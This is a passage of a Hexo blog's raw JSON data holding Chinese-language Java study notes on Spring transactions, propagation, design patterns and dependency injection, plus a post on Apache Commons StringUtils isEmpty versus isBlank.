function_\">testTransaction</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">    transactionTemplate.execute(<span class=\"keyword\">new</span> <span class=\"title class_\">TransactionCallbackWithoutResult</span>()&#123;</span><br><span class=\"line\">        <span class=\"meta\">@Override</span></span><br><span class=\"line\">        <span class=\"keyword\">protected</span> <span class=\"keyword\">void</span> <span class=\"title function_\">doInTransactionWithoutResult</span><span class=\"params\">(TransactionStatus status)</span>&#123;</span><br><span class=\"line\">                <span class=\"keyword\">try</span>&#123;</span><br><span class=\"line\">                    <span class=\"comment\">//...业务代码</span></span><br><span class=\"line\">                &#125;<span class=\"keyword\">catch</span>(Exception e)&#123;</span><br><span class=\"line\">                    status.setRollbackOnly();</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>TransactionManager</li>\n</ul>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">    <span class=\"meta\">@Autowired</span></span><br><span class=\"line\"><span class=\"keyword\">private</span> PlatformTransactionManager transactionManager;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">testTransaction2</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">        TransactionStatus status=transactionManager.getTransaction(<span class=\"keyword\">new</span> <span class=\"title class_\">DefaultTransactionDefinition</span>());</span><br><span class=\"line\">        <span class=\"keyword\">try</span>&#123;</span><br><span class=\"line\">            <span class=\"comment\">//...业务代码</span></span><br><span class=\"line\">            transactionManager.commit(status);</span><br><span class=\"line\">        &#125;<span class=\"keyword\">catch</span>(Exception e)&#123;</span><br><span class=\"line\">            transactionManager.rollback(status);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"2、注解\"><a href=\"#2、注解\" class=\"headerlink\" title=\"2、注解\"></a>2、注解</h4><ul>\n<li>@Transactional</li>\n</ul>\n<h3 id=\"事务的传播性-Propagation\"><a href=\"#事务的传播性-Propagation\" class=\"headerlink\" title=\"事务的传播性 Propagation\"></a>事务的传播性 Propagation</h3><p>① PROPAGATION_REQUIRED：如果当前没有事务，就创建一个新事务，如果当前存在事务，就加入该事务，该设置是最常用的设置。</p>\n<p>② PROPAGATION_SUPPORTS：支持当前事务，如果当前存在事务，就加入该事务，如果当前不存在事务，就以非事务执行。</p>\n<p>③ PROPAGATION_MANDATORY：支持当前事务，如果当前存在事务，就加入该事务，如果当前不存在事务，就抛出异常。</p>\n<p>④ PROPAGATION_REQUIRES_NEW：创建新事务，无论当前存不存在事务，都创建新事务。</p>\n<p>⑤ PROPAGATION_NOT_SUPPORTED：以非事务方式执行操作，如果当前存在事务，就把当前事务挂起。</p>\n<p>⑥ PROPAGATION_NEVER：以非事务方式执行，如果当前存在事务，则抛出异常。</p>\n<p>⑦ PROPAGATION_NESTED：如果当前存在事务，则在嵌套事务内执行。如果当前没有事务，则按REQUIRED属性执行。</p>\n<h3 id=\"spring事务失效的场景\"><a href=\"#spring事务失效的场景\" class=\"headerlink\" title=\"spring事务失效的场景\"></a>spring事务失效的场景</h3><ol>\n<li><p>非被Spring管理的Bean上的事务： 如果你在一个非被Spring容器管理的Bean（例如通过new关键字直接创建的对象）上使用事务注解，事务将不会生效。Spring的事务管理是基于AOP（面向切面编程）实现的，因此只能在由Spring容器管理的Bean上起作用。</p>\n</li>\n<li><p>未捕获的异常： 如果在事务内发生未捕获的运行时异常，事务将回滚。但是，如果异常被捕获并在方法内处理，事务可能不会回滚。确保在事务边界内处理异常或者允许异常传播到事务管理器以便正确回滚。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Transactional</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">transactionalMethod</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">// some code that may throw an exception</span></span><br><span class=\"line\">    &#125; <span class=\"keyword\">catch</span> (Exception e) &#123;</span><br><span class=\"line\">        <span class=\"comment\">// handle the exception (not recommended within a transaction)</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>嵌套事务问题： Spring事务支持嵌套事务，但是嵌套事务的行为取决于底层事务管理器的支持。如果使用的事务管理器不支持嵌套事务，嵌套事务可能会被忽略，导致事务行为不一致。</p>\n</li>\n<li><p>方法调用问题： Spring事务是通过AOP实现的，它依赖于代理对象来拦截方法调用并处理事务。如果你在同一个类内部调用一个带有事务注解的方法，事务可能不会起作用，因为代理对象无法拦截内部方法的调用。确保事务注解生效，要么调用方法是通过代理对象，要么通过self-invocation，例如通过this关键字。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Transactional</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">MyService</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">outerMethod</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        innerMethod(); <span class=\"comment\">// Transactional annotation may not work here</span></span><br><span class=\"line\">        <span class=\"built_in\">this</span>.innerMethod(); <span class=\"comment\">// Transactional annotation should work here</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Transactional</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">innerMethod</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">// some transactional logic</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>异步方法问题： 如果使用了异步方法（通过@Async注解），事务可能会失效。在异步方法内，事务上下文可能无法正确传播，导致事务不起作用。要在异步方法中使用事务，可以使用TransactionContext传播方式。</p>\n</li>\n</ol>\n<h2 id=\"spring使用的设计模式\"><a href=\"#spring使用的设计模式\" class=\"headerlink\" title=\"spring使用的设计模式\"></a>spring使用的设计模式</h2><h3 id=\"简单工厂\"><a href=\"#简单工厂\" class=\"headerlink\" title=\"简单工厂\"></a>简单工厂</h3><p><strong>实现方式：</strong></p>\n<p>BeanFactory。Spring中的BeanFactory就是简单工厂模式的体现，根据传入一个唯一的标识来获得Bean对象，但是否是在传入参数后创建还是传入参数前创建这个要根据具体情况来定。</p>\n<p><strong>实现原理：</strong></p>\n<p>bean容器的启动阶段：</p>\n<p>读取bean的xml配置文件,将bean元素分别转换成一个BeanDefinition对象。<br>然后通过BeanDefinitionRegistry将这些bean注册到beanFactory中，保存在它的一个ConcurrentHashMap中。<br>将BeanDefinition注册到了beanFactory之后，在这里Spring为我们提供了一个扩展的切口，允许我们通过实现接口BeanFactoryPostProcessor<br>在此处来插入我们定义的代码。典型的例子就是：PropertyPlaceholderConfigurer，我们一般在配置数据库的dataSource时使用到的占位符的值，就是它注入进去的。</p>\n<p>容器中bean的实例化阶段：</p>\n<p>实例化阶段主要是通过反射或者CGLIB对bean进行实例化，在这个阶段Spring又给我们暴露了很多的扩展点：</p>\n<p>各种的Aware接口 ，比如 BeanFactoryAware，对于实现了这些Aware接口的bean，在实例化bean时Spring会帮我们注入对应的BeanFactory的实例。 BeanPostProcessor接口<br>，实现了BeanPostProcessor接口的bean，在实例化bean时Spring会帮我们调用接口中的方法。 InitializingBean接口<br>，实现了InitializingBean接口的bean，在实例化bean时Spring会帮我们调用接口中的方法。 DisposableBean接口<br>，实现了DisposableBean接口的bean，在该bean死亡时Spring会帮我们调用接口中的方法。</p>\n<p><strong>设计意义：</strong></p>\n<p>松耦合。<br>可以将原来硬编码的依赖，通过Spring这个beanFactory这个工厂来注入依赖，也就是说原来只有依赖方和被依赖方，现在我们引入了第三方——spring这个beanFactory，由它来解决bean之间的依赖问题，达到了松耦合的效果.</p>\n<p>bean的额外处理。 通过Spring接口的暴露，在实例化bean的阶段我们可以进行一些额外的处理，这些额外的处理只需要让bean实现对应的接口即可，那么spring就会在bean的生命周期调用我们实现的接口来处理该bean。[非常重要]</p>\n<h3 id=\"工厂方法\"><a href=\"#工厂方法\" class=\"headerlink\" title=\"工厂方法\"></a>工厂方法</h3><p><strong>实现方式：</strong></p>\n<p>FactoryBean接口。</p>\n<p><strong>实现原理：</strong></p>\n<p>实现了FactoryBean接口的bean是一类叫做factory的bean。其特点是，spring会在使用getBean()调用获得该bean时，会自动调用该bean的getObject()<br>方法，所以返回的不是factory这个bean，而是这个bean.getOjbect()方法的返回值。</p>\n<h3 id=\"单例模式\"><a href=\"#单例模式\" class=\"headerlink\" title=\"单例模式\"></a>单例模式</h3><p>Spring依赖注入Bean实例默认是单例的。</p>\n<p>Spring的依赖注入（包括lazy-init方式）都是发生在AbstractBeanFactory的getBean里。getBean的doGetBean方法调用getSingleton进行bean的创建。</p>\n<h3 id=\"适配器模式\"><a href=\"#适配器模式\" class=\"headerlink\" title=\"适配器模式\"></a>适配器模式</h3><p><strong>实现方式：</strong></p>\n<p>SpringMVC中的适配器HandlerAdatper。</p>\n<p><strong>实现原理：</strong></p>\n<p>HandlerAdatper根据Handler规则执行不同的Handler。</p>\n<p><strong>实现过程：</strong></p>\n<p>DispatcherServlet根据HandlerMapping返回的handler，向HandlerAdatper发起请求，处理Handler。</p>\n<p>HandlerAdapter根据规则找到对应的Handler并让其执行，执行完毕后Handler会向HandlerAdapter返回一个ModelAndView，最后由HandlerAdapter向DispatchServelet返回一个ModelAndView。</p>\n<h3 id=\"装饰器模式\"><a href=\"#装饰器模式\" class=\"headerlink\" title=\"装饰器模式\"></a>装饰器模式</h3><p><strong>实现方式：</strong></p>\n<p>Spring中用到的包装器模式在类名上有两种表现：一种是类名中含有Wrapper，另一种是类名中含有Decorator。</p>\n<p><strong>实质：</strong></p>\n<p>动态地给一个对象添加一些额外的职责。</p>\n<p>就增加功能来说，Decorator模式相比生成子类更为灵活。</p>\n<h3 id=\"代理模式\"><a href=\"#代理模式\" class=\"headerlink\" title=\"代理模式\"></a>代理模式</h3><p><strong>实现方式：</strong></p>\n<p>AOP底层，就是动态代理模式的实现。</p>\n<p><strong>动态代理：</strong></p>\n<p>在内存中构建的，不需要手动编写代理类</p>\n<h2 id=\"spring中properties和yml的加载顺序\"><a href=\"#spring中properties和yml的加载顺序\" class=\"headerlink\" title=\"spring中properties和yml的加载顺序\"></a>spring中properties和yml的加载顺序</h2><p>相同内容properties和yml的加载顺序是properties优先</p>\n<h2 id=\"使用-Autowired注解自动装配的过程是怎样的？\"><a href=\"#使用-Autowired注解自动装配的过程是怎样的？\" class=\"headerlink\" title=\"使用@Autowired注解自动装配的过程是怎样的？\"></a>使用@Autowired注解自动装配的过程是怎样的？</h2><p>使用@Autowired注解来自动装配指定的bean。在使用@Autowired注解之前需要在Spring配置文件进行配置，&lt;context:annotation-config &#x2F;&gt;。</p>\n<p>在启动spring<br>IoC时，容器自动装载了一个AutowiredAnnotationBeanPostProcessor后置处理器，当容器扫描到@Autowied、@Resource或@Inject时，就会在IoC容器自动查找需要的bean，并装配给该对象的属性。在使用@Autowired时，首先在容器中查询对应类型的bean：</p>\n<ul>\n<li>如果查询结果刚好为一个，就将该bean装配给@Autowired指定的数据；</li>\n<li>如果查询的结果不止一个，那么@Autowired会根据名称来查找；</li>\n<li>如果上述查找的结果为空，那么会抛出异常。解决方法是，使用required&#x3D;false。</li>\n</ul>\n<h2 id=\"Autowired和-Resource之间的区别\"><a href=\"#Autowired和-Resource之间的区别\" class=\"headerlink\" title=\"@Autowired和@Resource之间的区别\"></a>@Autowired和@Resource之间的区别</h2><p>@Autowired可用于：构造函数、成员变量、Setter方法</p>\n<p>@Autowired和@Resource之间的区别</p>\n<ul>\n<li>@Autowired默认是按照类型装配注入的，默认情况下它要求依赖对象必须存在（可以设置它required属性为false）。</li>\n<li>@Resource默认是按照名称来装配注入的，只有当找不到与名称匹配的bean才会按照类型来装配注入。</li>\n</ul>\n<h2 id=\"Spring中BeanFactory与FactoryBean的区别\"><a href=\"#Spring中BeanFactory与FactoryBean的区别\" class=\"headerlink\" title=\"Spring中BeanFactory与FactoryBean的区别\"></a>Spring中BeanFactory与FactoryBean的区别</h2><h3 id=\"BeanFactory\"><a href=\"#BeanFactory\" class=\"headerlink\" title=\"BeanFactory\"></a>BeanFactory</h3><p>BeanFactory是一个接口，它是Spring中工厂的顶层规范，是SpringIoc容器的核心接口，它定义了getBean()、containsBean()等管理Bean的通用方法。Spring的容器都是它的具体实现如：</p>\n<ul>\n<li>DefaultListableBeanFactory</li>\n<li>XmlBeanFactory</li>\n<li>ApplicationContext</li>\n</ul>\n<p>这些实现类又从不同的维度分别有不同的扩展。</p>\n<h3 id=\"FactoryBean\"><a href=\"#FactoryBean\" class=\"headerlink\" title=\"FactoryBean\"></a>FactoryBean</h3><p>首先它是一个Bean，但又不仅仅是一个Bean。它是一个能生产或修饰对象生成的工厂Bean，类似于设计模式中的工厂模式和装饰器模式。它能在需要的时候生产一个对象，且不仅仅限于它自身，它能返回任何Bean的实例。</p>\n<p>FactoryBean表现的是一个工厂的职责。 即一个Bean A如果实现了FactoryBean接口，那么A就变成了一个工厂，根据A的名称获取到的实际上是工厂调用getObject()<br>返回的对象，而不是A本身，如果要获取工厂A自身的实例，那么需要在名称前面加上’&amp;’符号。</p>\n<ul>\n<li>getObject(‘name’)返回工厂中的实例</li>\n<li>getObject(‘&amp;name’)返回工厂本身的实例</li>\n</ul>\n"},{"title":"isEmpty和isBlank的用法区别居然一半的人答不上来","date":"2024-06-29T14:18:46.000Z","_content":"\n\n\n也许你两个都不知道,也许你除了isEmpty/isNotEmpty/isNotBlank/isBlank外,并不知道还有`isAnyEmpty/isNoneEmpty/isAnyBlank/isNoneBlank`的存在, come on ,让我们一起来探索`org.apache.commons.lang3.StringUtils;`这个工具类.\n\n# isEmpty系列\n\nStringUtils.isEmpty()\n---------------------\n\n`>>>`是否为空. 可以看到 `\" \"` 空格是会绕过这种空判断,因为是一个`空格`,并不是严格的`空值`,会导致 `isEmpty(\" \")=false`\n\n*   StringUtils.isEmpty(null) = true\n\n*   StringUtils.isEmpty(\"\") = true\n\n*   StringUtils.isEmpty(\" \") = false\n\n*   StringUtils.isEmpty(“bob”) = false\n\n*   StringUtils.isEmpty(\" bob \") = false\n\n\n```\n/**  \n  *  \n  * <p>NOTE: This method changed in Lang version 2.0.  \n  * It no longer trims the CharSequence.  \n  * That functionality is available in isBlank().</p>  \n  *  \n  * @param cs  the CharSequence to check, may be null  \n  * @return {@code true} if the CharSequence is empty or null  \n  * @since 3.0 Changed signature from isEmpty(String) to isEmpty(CharSequence)  \n*/  \npublic static boolean isEmpty(final CharSequence cs) {  \n   return cs == null || cs.length() == 0;  \n}  \n  \n\n```\n\nStringUtils.isNotEmpty()\n------------------------\n\n`>>>`相当于不为空 , = `!isEmpty()`\n\n```\npublic static boolean isNotEmpty(final CharSequence cs) {  \n    return !isEmpty(cs);  \n}  \n  \n\n```\n\nStringUtils.isAnyEmpty()\n------------------------\n\n`>>>`是否有一个为空,`只有一个为空,就为true`.\n\n*   StringUtils.isAnyEmpty(null) = true\n\n*   StringUtils.isAnyEmpty(null, “foo”) = true\n\n*   StringUtils.isAnyEmpty(\"\", “bar”) = true\n\n*   StringUtils.isAnyEmpty(“bob”, “”) = true\n\n*   StringUtils.isAnyEmpty(\" bob \", null) = true\n\n*   StringUtils.isAnyEmpty(\" \", “bar”) = false\n\n*   StringUtils.isAnyEmpty(“foo”, “bar”) = false\n\n\n![](./2024/06/29/isEmpty和isBlank的用法区别居然一半的人答不上来/1.png)\n\nStringUtils.isNoneEmpty()\n-------------------------\n\n`>>>`相当于`!isAnyEmpty(css)` , 必须所有的值都不为空才返回true\n\n[](https://mp.weixin.qq.com/s?__biz=MzI4NTM1NDgwNw==&mid=2247500365&idx=1&sn=7abfd8b30427d4ac15bb351c3dbb640c&scene=21#wechat_redirect)如果你近期准备面试跳槽，建议在ddkk.com在线刷题，涵盖 一万+ 道 Java 面试题，几乎覆盖了所有主流技术面试题，还有市面上最全的技术五百套，精品系列教程，免费提供。[](https://mp.weixin.qq.com/s?__biz=MzI4NTM1NDgwNw==&mid=2247500365&idx=1&sn=7abfd8b30427d4ac15bb351c3dbb640c&scene=21#wechat_redirect)\n\n```\n/**  \n * <p>Checks if none of the CharSequences are empty (\"\") or null.</p>  \n *  \n * <pre>  \n * StringUtils.isNoneEmpty(null)             = false  \n * StringUtils.isNoneEmpty(null, \"foo\")      = false  \n * StringUtils.isNoneEmpty(\"\", \"bar\")        = false  \n * StringUtils.isNoneEmpty(\"bob\", \"\")        = false  \n * StringUtils.isNoneEmpty(\"  bob  \", null)  = false  \n * StringUtils.isNoneEmpty(\" \", \"bar\")       = true  \n * StringUtils.isNoneEmpty(\"foo\", \"bar\")     = true  \n * </pre>  \n *  \n * @param css  the CharSequences to check, may be null or empty  \n * @return {@code true} if none of the CharSequences are empty or null  \n * @since 3.2  \n */  \npublic static boolean isNoneEmpty(final CharSequence... css) {  \n  \n  return !isAnyEmpty(css);  \n}    \n```\n\n# isBank系列\n\nStringUtils.isBlank()\n---------------------\n\n`>>>` `是否为真空值(空格或者空值)`\n\n*   StringUtils.isBlank(null) = true\n\n*   StringUtils.isBlank(\"\") = true\n\n*   StringUtils.isBlank(\" \") = true\n\n*   StringUtils.isBlank(“bob”) = false\n\n*   StringUtils.isBlank(\" bob \") = false\n\n\n![](./2024/06/29/isEmpty和isBlank的用法区别居然一半的人答不上来/2.png)\nStringUtils.isNotBlank()\n------------------------\n\n`>>>` `是否真的不为空`,不是空格或者空值 ,相当于`!isBlank();`\n\n![](./2024/06/29/isEmpty和isBlank的用法区别居然一半的人答不上来/3.png)\nStringUtils.isAnyBlank()\n------------------------\n\n`>>>`是否包含任何真空值`(包含空格或空值)`\n\n*   StringUtils.isAnyBlank(null) = true\n\n*   StringUtils.isAnyBlank(null, “foo”) = true\n\n*   StringUtils.isAnyBlank(null, null) = true\n\n*   StringUtils.isAnyBlank(\"\", “bar”) = true\n\n*   StringUtils.isAnyBlank(“bob”, “”) = true\n\n*   StringUtils.isAnyBlank(\" bob \", null) = true\n\n*   StringUtils.isAnyBlank(\" \", “bar”) = true\n\n*   StringUtils.isAnyBlank(“foo”, “bar”) = false\n\n\n```\n /**  \n * <p>Checks if any one of the CharSequences are blank (\"\") or null and not whitespace only..</p>  \n * @param css  the CharSequences to check, may be null or empty  \n * @return {@code true} if any of the CharSequences are blank or null or whitespace only  \n * @since 3.2  \n */  \npublic static boolean isAnyBlank(final CharSequence... css) {  \n  \n  \n  if (ArrayUtils.isEmpty(css)) {  \n  \n  \n    return true;  \n  }  \n  for (final CharSequence cs : css){  \n  \n  \n    if (isBlank(cs)) {  \n  \n  \n      return true;  \n    }  \n  }  \n  return false;  \n}\n```\n\nStringUtils.isNoneBlank()\n-------------------------\n\n`>>>`是否全部都不包含空值或空格\n\n*   StringUtils.isNoneBlank(null) = false\n\n*   StringUtils.isNoneBlank(null, “foo”) = false\n\n*   StringUtils.isNoneBlank(null, null) = false\n\n*   StringUtils.isNoneBlank(\"\", “bar”) = false\n\n*   StringUtils.isNoneBlank(“bob”, “”) = false\n\n*   StringUtils.isNoneBlank(\" bob \", null) = false\n\n*   StringUtils.isNoneBlank(\" \", “bar”) = false\n\n*   StringUtils.isNoneBlank(“foo”, “bar”) = true\n\n\n```\n/**  \n * <p>Checks if none of the CharSequences are blank (\"\") or null and whitespace only..</p>  \n * @param css  the CharSequences to check, may be null or empty  \n * @return {@code true} if none of the CharSequences are blank or null or whitespace only  \n * @since 3.2  \n */  \npublic static boolean isNoneBlank(final CharSequence... css) {  \n  \n  \n  return !isAnyBlank(css);  \n}  \n  \n\n","source":"_posts/isEmpty和isBlank的用法区别居然一半的人答不上来.md","raw":"---\ntitle: isEmpty和isBlank的用法区别居然一半的人答不上来\ndate: 2024-06-29 22:18:46\ntags: 字符串比较\ncategories: 面试\n---\n\n\n\n也许你两个都不知道,也许你除了isEmpty/isNotEmpty/isNotBlank/isBlank外,并不知道还有`isAnyEmpty/isNoneEmpty/isAnyBlank/isNoneBlank`的存在, come on ,让我们一起来探索`org.apache.commons.lang3.StringUtils;`这个工具类.\n\n# isEmpty系列\n\nStringUtils.isEmpty()\n---------------------\n\n`>>>`是否为空. 可以看到 `\" \"` 空格是会绕过这种空判断,因为是一个`空格`,并不是严格的`空值`,会导致 `isEmpty(\" \")=false`\n\n*   StringUtils.isEmpty(null) = true\n\n*   StringUtils.isEmpty(\"\") = true\n\n*   StringUtils.isEmpty(\" \") = false\n\n*   StringUtils.isEmpty(“bob”) = false\n\n*   StringUtils.isEmpty(\" bob \") = false\n\n\n```\n/**  \n  *  \n  * <p>NOTE: This method changed in Lang version 2.0.  \n  * It no longer trims the CharSequence.  \n  * That functionality is available in isBlank().</p>  \n  *  \n  * @param cs  the CharSequence to check, may be null  \n  * @return {@code true} if the CharSequence is empty or null  \n  * @since 3.0 Changed signature from isEmpty(String) to isEmpty(CharSequence)  \n*/  \npublic static boolean isEmpty(final CharSequence cs) {  \n   return cs == null || cs.length() == 0;  \n}  \n  \n\n```\n\nStringUtils.isNotEmpty()\n------------------------\n\n`>>>`相当于不为空 , = `!isEmpty()`\n\n```\npublic static boolean isNotEmpty(final CharSequence cs) {  \n    return !isEmpty(cs);  \n}  \n  \n\n```\n\nStringUtils.isAnyEmpty()\n------------------------\n\n`>>>`是否有一个为空,`只有一个为空,就为true`.\n\n*   StringUtils.isAnyEmpty(null) = true\n\n*   StringUtils.isAnyEmpty(null, “foo”) = true\n\n*   StringUtils.isAnyEmpty(\"\", “bar”) = true\n\n*   StringUtils.isAnyEmpty(“bob”, “”) = true\n\n*   StringUtils.isAnyEmpty(\" bob \", null) = true\n\n*   StringUtils.isAnyEmpty(\" \", “bar”) = false\n\n*   StringUtils.isAnyEmpty(“foo”, “bar”) = false\n\n\n![](./2024/06/29/isEmpty和isBlank的用法区别居然一半的人答不上来/1.png)\n\nStringUtils.isNoneEmpty()\n-------------------------\n\n`>>>`相当于`!isAnyEmpty(css)` , 必须所有的值都不为空才返回true\n\n[](https://mp.weixin.qq.com/s?__biz=MzI4NTM1NDgwNw==&mid=2247500365&idx=1&sn=7abfd8b30427d4ac15bb351c3dbb640c&scene=21#wechat_redirect)如果你近期准备面试跳槽，建议在ddkk.com在线刷题，涵盖 一万+ 道 Java 面试题，几乎覆盖了所有主流技术面试题，还有市面上最全的技术五百套，精品系列教程，免费提供。[](https://mp.weixin.qq.com/s?__biz=MzI4NTM1NDgwNw==&mid=2247500365&idx=1&sn=7abfd8b30427d4ac15bb351c3dbb640c&scene=21#wechat_redirect)\n\n```\n/**  \n * <p>Checks if none of the CharSequences are empty (\"\") or null.</p>  \n *  \n * <pre>  \n * StringUtils.isNoneEmpty(null)             = false  \n * StringUtils.isNoneEmpty(null, \"foo\")      = false  \n * StringUtils.isNoneEmpty(\"\", \"bar\")        = false  \n * StringUtils.isNoneEmpty(\"bob\", \"\")        = false  \n * StringUtils.isNoneEmpty(\"  bob  \", null)  = false  \n * StringUtils.isNoneEmpty(\" \", \"bar\")       = true  \n * StringUtils.isNoneEmpty(\"foo\", \"bar\")     = true  \n * </pre>  \n *  \n * @param css  the CharSequences to check, may be null or empty  \n * @return {@code true} if none of the CharSequences are empty or null  \n * @since 3.2  \n */  \npublic static boolean isNoneEmpty(final CharSequence... css) {  \n  \n  return !isAnyEmpty(css);  \n}    \n```\n\n# isBank系列\n\nStringUtils.isBlank()\n---------------------\n\n`>>>` `是否为真空值(空格或者空值)`\n\n*   StringUtils.isBlank(null) = true\n\n*   StringUtils.isBlank(\"\") = true\n\n*   StringUtils.isBlank(\" \") = true\n\n*   StringUtils.isBlank(“bob”) = false\n\n*   StringUtils.isBlank(\" bob \") = false\n\n\n![](./2024/06/29/isEmpty和isBlank的用法区别居然一半的人答不上来/2.png)\nStringUtils.isNotBlank()\n------------------------\n\n`>>>` `是否真的不为空`,不是空格或者空值 ,相当于`!isBlank();`\n\n![](./2024/06/29/isEmpty和isBlank的用法区别居然一半的人答不上来/3.png)\nStringUtils.isAnyBlank()\n------------------------\n\n`>>>`是否包含任何真空值`(包含空格或空值)`\n\n*   StringUtils.isAnyBlank(null) = true\n\n*   StringUtils.isAnyBlank(null, “foo”) = true\n\n*   StringUtils.isAnyBlank(null, null) = true\n\n*   StringUtils.isAnyBlank(\"\", “bar”) = true\n\n*   StringUtils.isAnyBlank(“bob”, “”) = true\n\n*   StringUtils.isAnyBlank(\" bob \", null) = true\n\n*   StringUtils.isAnyBlank(\" \", “bar”) = true\n\n*   StringUtils.isAnyBlank(“foo”, “bar”) = false\n\n\n```\n /**  \n * <p>Checks if any one of the CharSequences are blank (\"\") or null and not whitespace only..</p>  \n * @param css  the CharSequences to check, may be null or empty  \n * @return {@code true} if any of the CharSequences are blank or null or whitespace only  \n * @since 3.2  \n */  \npublic static boolean isAnyBlank(final CharSequence... css) {  \n  \n  \n  if (ArrayUtils.isEmpty(css)) {  \n  \n  \n    return true;  \n  }  \n  for (final CharSequence cs : css){  \n  \n  \n    if (isBlank(cs)) {  \n  \n  \n      return true;  \n    }  \n  }  \n  return false;  \n}\n```\n\nStringUtils.isNoneBlank()\n-------------------------\n\n`>>>`是否全部都不包含空值或空格\n\n*   StringUtils.isNoneBlank(null) = false\n\n*   StringUtils.isNoneBlank(null, “foo”) = false\n\n*   StringUtils.isNoneBlank(null, null) = false\n\n*   StringUtils.isNoneBlank(\"\", “bar”) = false\n\n*   StringUtils.isNoneBlank(“bob”, “”) = false\n\n*   StringUtils.isNoneBlank(\" bob \", null) = false\n\n*   StringUtils.isNoneBlank(\" \", “bar”) = false\n\n*   StringUtils.isNoneBlank(“foo”, “bar”) = true\n\n\n```\n/**  \n * <p>Checks if none of the CharSequences are blank (\"\") or null and whitespace only..</p>  \n * @param css  the CharSequences to check, may be null or empty  \n * @return {@code true} if none of the CharSequences are blank or null or whitespace only  \n * @since 3.2  \n */  \npublic static boolean isNoneBlank(final CharSequence... css) {  \n  \n  \n  return !isAnyBlank(css);  \n}  \n  \n\n","slug":"isEmpty和isBlank的用法区别居然一半的人答不上来","published":1,"updated":"2024-06-29T14:28:49.147Z","comments":1,"layout":"post","photos":[],"_id":"clylh1ryb0017bsuhgxw4gp44","content":"<p>也许你两个都不知道,也许你除了isEmpty&#x2F;isNotEmpty&#x2F;isNotBlank&#x2F;isBlank外,并不知道还有<code>isAnyEmpty/isNoneEmpty/isAnyBlank/isNoneBlank</code>的存在, come on ,让我们一起来探索<code>org.apache.commons.lang3.StringUtils;</code>这个工具类.</p>\n<h1 id=\"isEmpty系列\"><a href=\"#isEmpty系列\" class=\"headerlink\" title=\"isEmpty系列\"></a>isEmpty系列</h1><h2 id=\"StringUtils-isEmpty\"><a href=\"#StringUtils-isEmpty\" class=\"headerlink\" title=\"StringUtils.isEmpty()\"></a>StringUtils.isEmpty()</h2><p><code>&gt;&gt;&gt;</code>是否为空. 可以看到 <code>&quot; &quot;</code> 空格是会绕过这种空判断,因为是一个<code>空格</code>,并不是严格的<code>空值</code>,会导致 <code>isEmpty(&quot; &quot;)=false</code></p>\n<ul>\n<li><p>StringUtils.isEmpty(null) &#x3D; true</p>\n</li>\n<li><p>StringUtils.isEmpty(“”) &#x3D; true</p>\n</li>\n<li><p>StringUtils.isEmpty(“ “) &#x3D; false</p>\n</li>\n<li><p>StringUtils.isEmpty(“bob”) &#x3D; false</p>\n</li>\n<li><p>StringUtils.isEmpty(“ bob “) &#x3D; false</p>\n</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">/**  </span><br><span class=\"line\">  *  </span><br><span class=\"line\">  * &lt;p&gt;NOTE: This method changed in Lang version 2.0.  </span><br><span class=\"line\">  * It no longer trims the CharSequence.  </span><br><span class=\"line\">  * That functionality is available in isBlank().&lt;/p&gt;  </span><br><span class=\"line\">  *  </span><br><span class=\"line\">  * @param cs  the CharSequence to check, may be null  </span><br><span class=\"line\">  * @return &#123;@code true&#125; if the CharSequence is empty or null  </span><br><span class=\"line\">  * @since 3.0 Changed signature from isEmpty(String) to isEmpty(CharSequence)  </span><br><span class=\"line\">*/  </span><br><span class=\"line\">public static boolean isEmpty(final CharSequence cs) &#123;  </span><br><span class=\"line\">   return cs == null || cs.length() == 0;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"StringUtils-isNotEmpty\"><a href=\"#StringUtils-isNotEmpty\" class=\"headerlink\" title=\"StringUtils.isNotEmpty()\"></a>StringUtils.isNotEmpty()</h2><p><code>&gt;&gt;&gt;</code>相当于不为空 , &#x3D; <code>!isEmpty()</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">public static boolean isNotEmpty(final CharSequence cs) &#123;  </span><br><span class=\"line\">    return !isEmpty(cs);  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"StringUtils-isAnyEmpty\"><a href=\"#StringUtils-isAnyEmpty\" class=\"headerlink\" 